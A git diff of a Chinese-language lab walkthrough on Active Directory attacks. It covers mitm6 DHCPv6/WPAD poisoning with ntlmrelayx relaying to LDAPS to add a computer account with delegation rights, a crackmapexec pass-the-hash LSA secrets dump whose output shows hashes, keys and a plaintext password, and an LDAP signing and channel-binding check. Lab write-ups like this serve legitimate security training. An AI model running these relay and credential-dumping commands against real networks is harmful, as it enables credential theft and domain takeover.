@@ -406,15 +406,21 @@ C:\Windows\system32>
 ## Mitm6 + ntlmrelayx to ldap
 
 >由于MS16-077导致LLMNR/NBNS投毒指定WPAD文件方法失效，所以另一种有用方法是响应 DHCPv6 请求并将我们的主机设置为默认 DNS 服务器进行WPAD欺骗
-
+>
 >Windows 优先使用 IPv6 而不是 IPv4，因此我们可以捕获并毒害对 DHCPv6 查询的响应，使用**MITM6**更改 DNS 服务器并将查询重定向到我们的计算机
-
+>
 >在实际的IPv6网络中，客户端的IPv6是由主机本身分配的，不需要DHCP服务器
+>
+> NTLM 认证消息嵌入在 SMB、HTTP、MSSQL、SMTP 和 IMAP 等应用协议的数据包中，LM 和 NTLM 认证协议是"独立于应用协议的"
+>
+> 这意味着可以将某个协议（例如 HTTP）中继 LM 或 NTLM 认证消息 到 另一个协议（例如 SMB）。这称为跨协议 LM/NTLM 中继。这也意味着可能的中继和攻击取决于认证消息嵌入的应用协议
+> 下表总结了跨协议中继攻击的预期行为，具体取决于已经实施的缓解措施，表中列出的所有测试和结果均使用 Impacket 的 ntlmrelayx（Python）完成
+![Alt text](images/ntlm_relau_mitigation_chart.webp)
 
-* 启动mitm6来毒害 DHCPv6 并从主机获取 DNS 请求
-* 顺便说一句，我注意到我们可以毒害域控制器，但 DC 并不受影响，仍然使用他们的本地 DNS 服务器
+* 启动mitm6来毒化 DHCPv6 并从主机获取 DNS 请求
+* 顺便说一句，我注意到我们可以毒化域控制器，但 DC 并不受影响，仍然使用他们的本地 DNS 服务器
 * 所以只能毒化 MSSQL 服务器
-* 接下来将毒害 braavos 服务器将 wpad 查询并将 http 查询中继到 meereen 上的 ldaps，以添加具有委派权限的计算机
+* 接下来将毒化 braavos 服务器将 wpad 查询并将 http 查询中继到 meereen 上的 ldaps，以添加具有委派权限的计算机
 
 * 使用mitm6开始中毒并启动ntlmrelayx
 
@@ -427,7 +433,7 @@ sudo impacket-ntlmrelayx -6 -wh wpadfakeserver.essos.local -t ldaps://meereen.es
 ```
 
 * -6 : 在 IPv4 和 IPv6 网络上监听并执行操作
-* -wh : ntlmrelayx 返回托管 WPAD 文件的服务器,由于不需要 WPAD 文件中的任何内容（mitm6 回答了所有问题），必须选择网络中不存在的主机
+* -wh : ntlmrelayx 返回托管 WPAD 文件的服务器，由于不需要 WPAD 文件中的任何内容（mitm6 回答了所有问题），必须选择网络中不存在的主机
 * -t : 将凭据中继到指定的服务器，如果没有"-t"，凭据将转发回客户端
 * --add-computer : 尝试添加新的计算机帐户
 * --delegate-access : 将中继计算机帐户的访问权限委派给指定帐户(启动委派攻击)
@@ -435,11 +441,11 @@ sudo impacket-ntlmrelayx -6 -wh wpadfakeserver.essos.local -t ldaps://meereen.es
 现在DNS已经中毒了
 ![mitm6-1](images/mitm6-1.png)
 
-等待 wpad http 查询将请求转发到 ldap（您可以重新启动虚拟机以中毒和利用，无需等待）
+等待 wpad http 查询将请求转发到 ldaps（根据上表结果 http 能够中继到 ldaps，可以重新启动虚拟机以中毒和利用，无需等待）
 
 ![ntlmrelayx1](images/ntlmrelayx1.png)
 
-成功创建新的计算机帐户并授予其对受害计算机的委派权限
+可以看到机器账户ESSOS/BRAAVOS$的http请求转发到ldaps，BRAAVOS$作为机器账户自然具备创建机器账户和修改msDS-AllowedToActOnBehalfOfOtherIdentity属性权限（域用户具有创建10个机器账户权限），所以成功创建新的计算机帐户并授予其对受害计算机的委派权限
 
 ```bash
 [*] Attempting to create computer in: CN=Computers,DC=essos,DC=local
@@ -503,6 +509,7 @@ impacket-ntlmrelayx -6 -wh wpadfakeserver.essos.local -t ldaps://meereen.essos.l
 
 <https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/>
 <https://chryzsh.github.io/relaying-delegation/>
+<https://tttang.com/archive/1617/>
 
 ## Coerced auth smb + ntlmrelayx to ldaps with drop the mic
 
@@ -580,6 +587,50 @@ NL$KM:267200bb64cbddd73420b4ac7e9a9905759540efc7ed723ef46693e73dc9b856ece86e4e40
 essos.local\sql_svc:YouWillNotKerboroast1ngMeeeeee
 [*] Cleaning up... 
 [*] Stopping service RemoteRegistry
+```
+
+```bash
+ sudo crackmapexec smb 192.168.56.23 --local-auth -u "Administrator" -H "492c19fde6db57a251bf44c2b756ec3b" --lsa
+```
+
+```bash
+SMB         192.168.56.23   445    BRAAVOS          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:BRAAVOS) (domain:BRAAVOS) (signing:False) (SMBv1:True)
+SMB         192.168.56.23   445    BRAAVOS          [+] BRAAVOS\Administrator:492c19fde6db57a251bf44c2b756ec3b (Pwn3d!)
+SMB         192.168.56.23   445    BRAAVOS          [+] Dumping LSA secrets
+SMB         192.168.56.23   445    BRAAVOS          ESSOS.LOCAL/sql_svc:$DCC2$10240#sql_svc#89e701ebbd305e4f5380c5150494584a
+SMB         192.168.56.23   445    BRAAVOS          ESSOS\BRAAVOS$:aes256-cts-hmac-sha1-96:8e8bb65ebc790bb9fdc708b1f83619a2afed6a7d87c1579058f274d1e1e6f525
+SMB         192.168.56.23   445    BRAAVOS          ESSOS\BRAAVOS$:aes128-cts-hmac-sha1-96:81f102359f39be3303cbd6f3cccd0180
+SMB         192.168.56.23   445    BRAAVOS          ESSOS\BRAAVOS$:des-cbc-md5:f8945bc16b85cea1
+SMB         192.168.56.23   445    BRAAVOS          ESSOS\BRAAVOS$:plain_password_hex:edac40d9659b8ff518930713a28b8c320ac028f62422b9cc827e8c168e3724e385101235ccbf681865fa403b7ed147ab9cca05df1af00224002c4bc55c5981287c7ad9d861d32e5ea1e3dc3909792e414a3d80de6580867a5b9d43d8cb06e18a7546a9a20ad16addd7a96be91cb4cd0ec6753f9e9807fe9c4c0209bb7a2d5c4e61113548fe74158e0d81e3f80a1bc9f1e9467c231ae98553d952edf7754a0e0a2671284efee120f0a8ad398566d12bf8ebd77b2b701f2b4f73d8958f0c1736b5bbd3a709d2dbc1c06d0e406d6e17f7e8401de0f1fb53434ecf298bf091217dd9a4d5b13e8cfc5bf67dcbcf759ac8a3b0
+SMB         192.168.56.23   445    BRAAVOS          ESSOS\BRAAVOS$:aad3b435b51404eeaad3b435b51404ee:8e041276acf964a317f358c9d7fa71fd:::
+SMB         192.168.56.23   445    BRAAVOS          dpapi_machinekey:0x15a98c9d9a40dbd9f71472cc20e6ed21046177d8
+dpapi_userkey:0x1935d54fb2e3d629e6dbf76dbc988c08a31529a2
+SMB         192.168.56.23   445    BRAAVOS          NL$KM:267200bb64cbddd73420b4ac7e9a9905759540efc7ed723ef46693e73dc9b856ece86e4e40138634a8f6e636c6719f7a8f63a323d937a0bc07c00b0641215e64
+SMB         192.168.56.23   445    BRAAVOS          essos.local\sql_svc:YouWillNotKerboroast1ngMeeeeee
+SMB         192.168.56.23   445    BRAAVOS          [+] Dumped 9 LSA secrets to /root/.cme/logs/BRAAVOS_192.168.56.23_2023-08-07_053439.secrets and /root/.cme/logs/BRAAVOS_192.168.56.23_2023-08-07_053439.cached
+```
+
+### 补充
+
+通过crackmapexec来查看ldaps是否开启签名和通道绑定
+
+```bash
+sudo crackmapexec ldap 192.168.56.10-12  -u robb.stark -p "sexywolfy" -d "north.sevenkingdoms.local" -M ldap-checker
+```
+
+```bash
+SMB         192.168.56.12   445    MEEREEN          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:MEEREEN) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:True)
+SMB         192.168.56.10   445    KINGSLANDING     [*] Windows 10.0 Build 17763 x64 (name:KINGSLANDING) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
+SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10.0 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
+LDAP        192.168.56.12   389    MEEREEN          [+] north.sevenkingdoms.local\robb.stark:sexywolfy 
+LDAP        192.168.56.10   389    KINGSLANDING     [+] north.sevenkingdoms.local\robb.stark:sexywolfy 
+LDAP-CHE... 192.168.56.12   389    MEEREEN          LDAP Signing NOT Enforced!
+LDAP        192.168.56.11   389    WINTERFELL       [+] north.sevenkingdoms.local\robb.stark:sexywolfy 
+LDAP-CHE... 192.168.56.10   389    KINGSLANDING     LDAP Signing NOT Enforced!
+LDAP-CHE... 192.168.56.11   389    WINTERFELL       LDAP Signing NOT Enforced!
+LDAP-CHE... 192.168.56.12   389    MEEREEN          Channel Binding is set to "NEVER" - Time to PWN!
+LDAP-CHE... 192.168.56.10   389    KINGSLANDING     Channel Binding is set to "NEVER" - Time to PWN!
+LDAP-CHE... 192.168.56.11   389    WINTERFELL       Channel Binding is set to "NEVER" - Time to PWN!
 ```
 
 参考链接：
